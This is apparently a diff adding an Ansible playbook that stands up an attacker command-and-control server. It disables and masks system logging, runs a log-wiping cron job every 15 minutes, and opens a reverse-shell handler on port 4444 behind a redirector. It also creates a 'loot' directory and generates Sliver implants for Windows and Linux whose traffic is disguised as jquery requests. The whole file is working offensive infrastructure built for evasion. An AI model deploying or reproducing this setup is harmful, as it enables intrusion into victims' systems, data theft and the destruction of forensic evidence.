@@ -1,0 +1,164 @@
+---
+- name: Update and install required packages
+  apt:
+    name:
+      - curl
+      - wget
+      - git
+      - tmux
+      - netcat
+      - python3
+      - python3-pip
+      - ufw
+    state: present
+    update_cache: yes
+
+- name: Disable system logging services
+  systemd:
+    name: "{{ item }}"
+    state: stopped
+    enabled: no
+    masked: yes
+  with_items:
+    - rsyslog
+    - systemd-journald
+  ignore_errors: yes
+
+- name: Configure UFW
+  ufw:
+    state: enabled
+    policy: deny
+    direction: incoming
+  ignore_errors: yes
+
+- name: Allow SSH through UFW only from redirector
+  ufw:
+    rule: allow
+    port: ssh
+    proto: tcp
+    from_ip: "{{ redirector_ip }}"
+  ignore_errors: yes
+
+- name: Allow HTTP through UFW only from redirector
+  ufw:
+    rule: allow
+    port: http
+    proto: tcp
+    from_ip: "{{ redirector_ip }}"
+  ignore_errors: yes
+
+- name: Allow HTTPS through UFW only from redirector
+  ufw:
+    rule: allow
+    port: https
+    proto: tcp
+    from_ip: "{{ redirector_ip }}"
+  ignore_errors: yes
+
+- name: Allow shell handler port through UFW only from redirector
+  ufw:
+    rule: allow
+    port: 4444
+    proto: tcp
+    from_ip: "{{ redirector_ip }}"
+  ignore_errors: yes
+
+- name: Allow beacon server port through UFW only from redirector
+  ufw:
+    rule: allow
+    port: 8080
+    proto: tcp
+    from_ip: "{{ redirector_ip }}"
+  ignore_errors: yes
+
+- name: Create C2 directories
+  file:
+    path: "{{ item }}"
+    state: directory
+    mode: '0755'
+  with_items:
+    - /opt/c2
+    - /opt/c2/implants
+    - /opt/c2/shells
+    - /opt/c2/scripts
+    - /opt/c2/loot
+
+- name: Download Sliver C2 framework
+  get_url:
+    url: https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux
+    dest: /opt/c2/sliver-server
+    mode: '0755'
+
+- name: Copy persistent listener script
+  copy:
+    src: files/persistent-listener.sh
+    dest: /opt/c2/scripts/persistent-listener.sh
+    mode: '0755'
+
+- name: Copy beacon server script
+  copy:
+    src: files/serve-beacons.sh
+    dest: /opt/c2/scripts/serve-beacons.sh
+    mode: '0755'
+
+- name: Copy Sliver configuration script
+  copy:
+    src: files/sliver-config.txt
+    dest: /opt/c2/sliver-config.txt
+    mode: '0644'
+
+- name: Copy log cleaning script
+  copy:
+    src: files/clean-logs.sh
+    dest: /usr/local/bin/clean-logs.sh
+    mode: '0755'
+
+- name: Copy secure exit script
+  copy:
+    src: files/secure-exit.sh
+    dest: /usr/local/bin/secure-exit.sh
+    mode: '0755'
+
+- name: Create Sliver systemd service
+  template:
+    src: templates/sliver-server.service.j2
+    dest: /etc/systemd/system/sliver-server.service
+    mode: '0644'
+
+- name: Create shell handler systemd service
+  template:
+    src: templates/shell-handler.service.j2
+    dest: /etc/systemd/system/shell-handler.service
+    mode: '0644'
+
+- name: Set up cron job for log cleaning
+  cron:
+    name: "Clean logs"
+    minute: "*/15"
+    job: "/usr/local/bin/clean-logs.sh"
+
+- name: Enable and start Sliver service
+  systemd:
+    name: sliver-server
+    state: started
+    enabled: yes
+    daemon_reload: yes
+
+- name: Wait for Sliver to initialize
+  wait_for:
+    timeout: 30
+
+- name: Generate Sliver implants
+  shell: |
+    cd /opt/c2
+    echo "new-profile --profile-name jquery --http 'jquery-3.3.1.min.js' --jitter 37" | ./sliver-server
+    echo "generate --profile jquery --os windows --arch amd64 --save /opt/c2/implants/" | ./sliver-server
+    echo "generate --profile jquery --os linux --arch amd64 --save /opt/c2/implants/" | ./sliver-server
+  args:
+    executable: /bin/bash
+
+- name: Enable and start shell handler service
+  systemd:
+    name: shell-handler
+    state: started
+    enabled: yes
